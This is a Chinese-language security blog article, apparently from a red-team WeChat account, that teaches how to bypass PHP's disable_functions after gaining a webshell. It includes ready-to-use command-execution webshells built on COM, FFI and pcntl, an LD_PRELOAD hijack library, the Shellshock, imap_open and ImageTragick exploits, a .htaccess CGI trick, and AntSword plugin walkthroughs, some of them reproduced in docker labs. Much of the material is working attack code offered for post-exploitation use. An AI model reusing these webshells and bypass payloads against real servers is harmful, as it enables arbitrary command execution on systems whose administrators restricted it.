##  干货|从零学习bypass disable_function

原创 SD  [ 乌雲安全 ](javascript:void\(0\);)

**乌雲安全** ![]()

微信号 hackctf

功能介绍
乌雲安全，致力于红队攻防实战、内网渗透、代码审计、社工、安卓逆向、CTF比赛技巧、安全运维等技术干货分享，并预警最新漏洞，定期分享常用渗透工具、教程等资源。

____

__

收录于话题

#渗透思路 10

#网络安全 5

#渗透技巧 16

#web安全 15

#bypass 3

## disable_functions

disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。

![](https://gitee.com/fuli009/images/raw/master/public/20210820102311.png)

  

比如拿到一个webshell,用管理工具去连接,执行命令发现`ret=127`,实际上就是因为被这个限制的原因

![]()

  

## 黑名单

    
    
    assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open  
    

观察php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可。

## 利用Windows组件COM绕过

查看`com.allow_dcom`是否开启,这个默认是不开启的。

![](https://gitee.com/fuli009/images/raw/master/public/20210820102312.png)

创建一个COM对象,通过调用COM对象的`exec`替我们执行命令

    
    
    <?php  
    $wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';  
    if($wsh == 'wscript') {  
        $command = $_GET['cmd'];  
        $wshit = new COM('WScript.shell') or die("Create Wscript.Shell Failed!");  
        $exec = $wshit->exec("cmd /c".$command);  
        $stdout = $exec->StdOut();  
        $stroutput = $stdout->ReadAll();  
        echo $stroutput;  
    }  
    elseif($wsh == 'application') {  
        $command = $_GET['cmd'];  
        $wshit = new COM("Shell.Application") or die("Shell.Application Failed!");  
        $exec = $wshit->ShellExecute("cmd","/c ".$command);  
    }   
    else {  
      echo(0);  
    }  
    ?>  
    

  

##

![](https://gitee.com/fuli009/images/raw/master/public/20210820102313.png)

## 利用Linux环境变量LD_PRELOAD  

### 初阶

    
    
    LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。  
    

总的来说就是=`LD_PRELOAD`指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果。

思路为:

  1. 创建一个.so文件,linux的动态链接库文件
  2. 使用putenv函数将`LD_PRELOAD`路径设置为我们自己创建的动态链接库文件
  3. 利用某个函数去触发该动态链接库

这里以`mail()`函数举例。在底层c语言中,`mail.c`中会调用`sendmail`，而sendmail_path使从ini文件中说明

    
    
    ; For Unix only.  You may supply arguments as well (default: "sendmail -t -i").   
    ;sendmail_path =  
    

默认为"sendmail -t -i"

![](https://gitee.com/fuli009/images/raw/master/public/20210820102314.png)

但是sendmail并不是默认安装的,需要自己下载  

使用命令`readelf -Ws /usr/sbin/sendmail`可以看到sendmail调用了哪些库函数,这里选择`geteuid`

![](https://gitee.com/fuli009/images/raw/master/public/20210820102315.png)

  

![]()

创建一个`test.c`文件,并定义一个`geteuid`函数,目的是劫持该函数。

    
    
    #include <stdlib.h>  
    #include <stdio.h>  
    #include <string.h>  
    void payload() {  
        system("whoami > /var/tmp/sd.txt");  
    }  
    int geteuid()  
    {  
        if (getenv("LD_PRELOAD") == NULL) { return 0; }  
        unsetenv("LD_PRELOAD");  
        payload();  
    }  
    

使用gcc编译为.so文件

    
    
    gcc -c -fPIC test.c -o test  
    gcc -shared test -o test.so  
    

这里有个坑:不要在windows上编译,编译出来是MZ头,不是ELF。

然后再上传test.so到指定目录下。

最后创建`shell.php`文件,上传到网站目录下,这里.so文件路径要写对。

    
    
    <?php  
    putenv("LD_PRELOAD=/var/www/test.so");  
    mail("","","","","");  
    ?>  
    

再理一下整个过程:当我们访问shell.php文件的时候,先会将`LD_PRELOAD`路径设置为恶意的.so文件，然后触发mail()函数,mail函数会调用sendmail函数,sendmail函数会调用库函数geteuid,而库函数geteuid已经被优先加载,这时执行geteuid就是执行的我们自己定义的函数,并执行payload(),也就是代码中的`whoami`命令写入到sd.txt中。

由于拿到的webshell很有可能是`www-data`这种普通权限。整个过程要注意权限问题,要可写的目录下。

![](https://gitee.com/fuli009/images/raw/master/public/20210820102316.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210820102317.png)

web访问页面没有文件写出,可以看看定义的目录是否有权限。

### 进阶版

在整个流程中,唯一担心的是sendmail没有安装怎么办,它可不是默认安装的,而拿到的webshell权限一般也不高,无法自行安装,也不能改php.ini。

而有前辈早已指出:无需sendmail：巧用LD_PRELOAD突破disable_functions细节已经说的非常明白,这里只复现,在此不再画蛇添足。

去github下载三个重要文件:
bypass_disablefunc.php,bypass_disablefunc_x64.so或bypass_disablefunc_x86.so,bypass_disablefunc.c
将 bypass_disablefunc.php 和
bypass_disablefunc_x64.so传到目标有权限的目录中。这里很有可能无法直接上传到web目录,解决办法就是上传到有权限的目录下,并用include去包含。

![](https://gitee.com/fuli009/images/raw/master/public/20210820102318.png)

  

这里我已经卸载了sendmail文件

![]()

  

注意区分post和get

![](https://gitee.com/fuli009/images/raw/master/public/20210820102319.png)

## 利用PHP7.4 FFI绕过

FFI（Foreign Function
Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。当PHP所有的命令执行函数被禁用后，通过PHP
7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass
disable_functions。具体请参考Foreign Function Interface

当前php版本为7.4.3

![](https://gitee.com/fuli009/images/raw/master/public/20210820102320.png)

  

先看FFI是否开启,并且ffi.enable需要设置为true

![](https://gitee.com/fuli009/images/raw/master/public/20210820102321.png)

  

使用FFI::cdef创建一个新的FFI对象

![](https://gitee.com/fuli009/images/raw/master/public/20210820102322.png)

  

通过c语言的system去执行,绕过disable functions。将返回结果写入/tmp/SD，并在每次读出结果后用unlink()函数删除它。

    
    
    <?php  
    $cmd=$_GET['cmd'];  
    $ffi = FFI::cdef("int system(const char *command);");  
    $ffi->system("$cmd > /tmp/SD");       //由GET传参的任意代码执行  
    echo file_get_contents("/tmp/SD");  
    @unlink("/tmp/SD");  
    ?>  
    

  

##

![](https://gitee.com/fuli009/images/raw/master/public/20210820102323.png)

## 利用Bash Shellshock(CVE-2014-6271)破壳漏洞  

利用条件php < 5.6.2 & bash <= 4.3（破壳）

Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

简单测试是否存在破壳漏洞: 命令行输入`env x='() { :;}; echo vulnerable' bash -c "echo this is a
test"`如果输出了`vulnerable`，则说明存在bash破壳漏洞

![]()

EXP如下:

    
    
    <?php   
    # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)   
    # Google Dork: none   
    # Date: 10/31/2014   
    # Exploit Author: Ryan King (Starfall)   
    # Vendor Homepage: http://php.net   
    # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror   
    # Version: 5.* (tested on 5.6.2)   
    # Tested on: Debian 7 and CentOS 5 and 6   
    # CVE: CVE-2014-6271   
      
    function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283   
       $tmp = tempnam(".","data");   
       putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");   
       // In Safe Mode, the user may only alter environment variableswhose names   
       // begin with the prefixes supplied by this directive.   
       // By default, users will only be able to set environment variablesthat   
       // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty,   
       // PHP will let the user modify ANY environment variable!   
       //mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail   
       error_log('a',1);  
       $output = @file_get_contents($tmp);   
       @unlink($tmp);   
       if($output != "") return $output;   
       else return "No output, or not vuln.";   
    }   
    echo shellshock($_REQUEST["cmd"]);   
    ?>       
    

选择可上传目录路径,上传exp

![](https://gitee.com/fuli009/images/raw/master/public/20210820102324.png)

  

包含文件执行

![](https://gitee.com/fuli009/images/raw/master/public/20210820102325.png)

  

## 利用imap_open()绕过

利用条件需要安装iamp扩展,命令行输入:`apt-get install php-
imap`在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。

![](https://gitee.com/fuli009/images/raw/master/public/20210820102326.png)

  

基本原理为:

    
    
    PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。  
    

EXP:

    
    
    <?php   
    error_reporting(0);   
    if (!function_exists('imap_open')) {   
    die("no imap_open function!");   
    }   
    $server = "x -oProxyCommand=echot" . base64_encode($_GET['cmd'] .  
    ">/tmp/cmd_result") . "|base64t-d|sh}";   
    //$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] .  
    ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';   
    imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or  
    var_dump("nnError: ".imap_last_error());   
    sleep(5);   
    echo file_get_contents("/tmp/cmd_result");   
    ?>  
    

## 利用Pcntl组件

如果目标机器安装并启用了php组件Pcntl,就可以使用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令,也算是过黑名单的一钟,比较简单。

exp为:

    
    
    #pcntl_exec().php  
    <?php pcntl_exec("/bin/bash", array("/tmp/b4dboy.sh"));?>  
    #/tmp/b4dboy.sh  
    #!/bin/bash  
    ls -l /  
    

## 利用ImageMagick 漏洞绕过(CVE-2016–3714)

利用条件:

  * 目标主机安装了漏洞版本的imagemagick（<= 3.3.0）
  * 安装了php-imagick拓展并在php.ini中启用；
  * 编写php通过new Imagick对象的方式来处理图片等格式文件；
  * PHP >= 5.4

### ImageMagick介绍

ImageMagick是一套功能强大、稳定而且开源的工具集和开发包,可以用来读、写和处理超过89种基本格式的图片文件,包括流行的TIFF、JPEG、GIF、
PNG、PDF以及PhotoCD等格式。众多的网站平台都是用他渲染处理图片。可惜在3号时被公开了一些列漏洞,其中一个漏洞可导致远程执行代码(RCE),如果你处理用户提交的图片。该漏洞是针对在野外使用此漏洞。许多图像处理插件依赖于ImageMagick库,包括但不限于PHP的imagick,Ruby的rmagick和paperclip,以及NodeJS的ImageMagick等。

产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。

据ImageMagick官方，目前程序存在一处远程命令执行漏洞（CVE-2016-3714），当其处理的上传图片带有攻击代码时，可远程实现远程命令执行，进而可能控制服务器，此漏洞被命名为ImageTragick。EXP如下:

    
    
    <?php  
    echo "Disable Functions: " . ini_get('disable_functions') . "\n";  
      
    $command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];  
    if ($command == '') {  
        $command = 'id';  
    }  
      
    $exploit = <<<EOF  
    push graphic-context  
    viewbox 0 0 640 480  
    fill 'url(https://example.com/image.jpg"|$command")'  
    pop graphic-context  
    EOF;  
      
    file_put_contents("KKKK.mvg", $exploit);  
    $thumb = new Imagick();  
    $thumb->readImage('KKKK.mvg');  
    $thumb->writeImage('KKKK.png');  
    $thumb->clear();  
    $thumb->destroy();  
    unlink("KKKK.mvg");  
    unlink("KKKK.png");  
    ?>  
    

漏洞原理参考p牛文章:https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html

### 漏洞复现

获取和运行镜像

    
    
    docker pull medicean/vulapps:i_imagemagick_1  
    docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1  
    

访问`phpinfo.php`,发现开启了imagemagick服务

![](https://gitee.com/fuli009/images/raw/master/public/20210820102327.png)

  

进入容器:`docker run -t -i medicean/vulapps:i_imagemagick_1 "/bin/bash"`

![](https://gitee.com/fuli009/images/raw/master/public/20210820102328.png)

查看`poc.php`,这其实是已经写好的poc,执行命令就是`ls -la`

![]()

  

验证poc,在容器外执行`docker exec i_imagemagick_1 convert /poc.png 1.png`

![](https://gitee.com/fuli009/images/raw/master/public/20210820102329.png)

## 利用 Apache Mod CGI

利用条件:

  * Apache + PHP (apache 使用 apache_mod_php)
  * Apache 开启了 cgi, rewrite
  * Web 目录给了 AllowOverride 权限

### 关于mod_cgi是什么

http://httpd.apache.org/docs/current/mod/mod_cgi.html任何具有MIME类型application/x-httpd-
cgi或者被cgi-
script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。当Apache
开启了cgi,
rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。

### 如何利用

由于环境搭建困难,使用蚁剑的docker

![](https://gitee.com/fuli009/images/raw/master/public/20210820102331.png)

  

在web目录下上传`.htaccess`文件

    
    
    Options +ExecCGI  
    AddHandler cgi-script .ant  
    

上传shell.ant

    
    
    #!/bin/sh  
    echo Content-type: text/html  
    echo ""  
    echo&&id  
    

由于目标是liunx系统,linux中CGI比较严格。这里也需要去liunx系统创建文件上传,如果使用windows创建文件并上传是无法解析的。

![]()

  

直接访问shell.xxx ,这里报错,是因为没有权限访问

![](https://gitee.com/fuli009/images/raw/master/public/20210820102332.png)

  

直接使用蚁剑修改权限

![](https://gitee.com/fuli009/images/raw/master/public/20210820102333.png)

复现成功

![](https://gitee.com/fuli009/images/raw/master/public/20210820102334.png)

  

## 利用攻击PHP-FPM

利用条件

  * Linux 操作系统
  * PHP-FPM
  * 存在可写的目录, 需要上传 .so 文件

关于什么是PHP-FPM,这个可以看https://www.php.cn/php-weizijiaocheng-455614.html关于如何攻击PHP-
FPM,请看这篇浅析php-fpm的攻击方式

蚁剑环境

    
    
    git clone https://github.com/AntSwordProject/AntSword-Labs.git  
    cd AntSword-Labs/1s/5  
    docker-compose up -d  
    

连接shell后无法执行命令

![]()

  

查看phpinfo,发现目标主机配置了`FPM/Fastcgi`

![](https://gitee.com/fuli009/images/raw/master/public/20210820102335.png)

  

使用插件

![](https://gitee.com/fuli009/images/raw/master/public/20210820102336.png)

  

要注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，本例中PHP-FPM 的接口地址，发现是
127.0.0.1:9000,所以这里改为127.0.0.1：9000

![](https://gitee.com/fuli009/images/raw/master/public/20210820102337.png)

  

但是这里我死活利用不了

![](https://gitee.com/fuli009/images/raw/master/public/20210820102338.png)

  

这里换了几个版本还是不行，但看网上师傅利用是没问题的
有感兴趣想复现师傅看这里:https://github.com/AntSwordProject/AntSword-Labs/tree/master/1s/5

## 利用 GC UAF

利用条件

  * Linux 操作系统
  * PHP7.0 - all versions to date
  * PHP7.1 - all versions to date
  * PHP7.2 - all versions to date
  * PHP7.3 - all versions to date

EXP关于原理通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。

搭建环境

    
    
    cd AntSword-Labs/1s/6  
    docker-compose up -d  
    

受到disable_function无法执行命令

![](https://gitee.com/fuli009/images/raw/master/public/20210820102339.png)

  

使用插件成功执行后弹出一个新的虚拟终端，成功bypass

![](https://gitee.com/fuli009/images/raw/master/public/20210820102340.png)

  

## 利用 Json Serializer UAF

利用条件

  * Linux 操作系统
  * PHP7.1 - all versions to date
  * PHP7.2 < 7.2.19 (released: 30 May 2019)
  * PHP7.3 < 7.3.6 (released: 30 May 2019)

利用漏洞POC

上传POC到`/var/tmp`目录下

![](https://gitee.com/fuli009/images/raw/master/public/20210820102341.png)

  

包含bypass文件

![](https://gitee.com/fuli009/images/raw/master/public/20210820102342.png)

  

也可以稍作修改

![]()

![](https://gitee.com/fuli009/images/raw/master/public/20210820102343.png)

  

当然使用插件是最简单的

![](https://gitee.com/fuli009/images/raw/master/public/20210820102344.png)

  

##

## 利用iconv

利用条件

  * Linux 操作系统
  * `putenv`
  * `iconv`
  * 存在可写的目录, 需要上传 `.so` 文件

利用原理分析https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-
from-fopen-s-2nd-Argument/

利用复现: 获得镜像

    
    
    git clone https://github.com/AntSwordProject/AntSword-Labs.git  
    cd AntSword-Labs/1s/9  
    docker-compose up -d  
    

无法执行命令

![](https://gitee.com/fuli009/images/raw/master/public/20210820102345.png)

  

使用iconv插件bypass

![](https://gitee.com/fuli009/images/raw/master/public/20210820102346.png)

  

创建副本后,将url改为`/.antproxy.php`

![](https://gitee.com/fuli009/images/raw/master/public/20210820102347.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210820102348.png)

  

## Reference

https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#Bypass-3

https://whoamianony.top/2021/03/13/Web安全/Bypass Disable_functions/

https://clq0.top/bypass-disable_function-php/#iconv

https://github.com/AntSwordProject/AntSword-Labs

https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-
CVE-2014-6271.html

作者：SD，原创投稿。

 **觉得不错点个 **“赞”** 、“在看”哦**
**![](https://gitee.com/fuli009/images/raw/master/public/20210820102349.png)**

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

干货|从零学习bypass disable_function

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

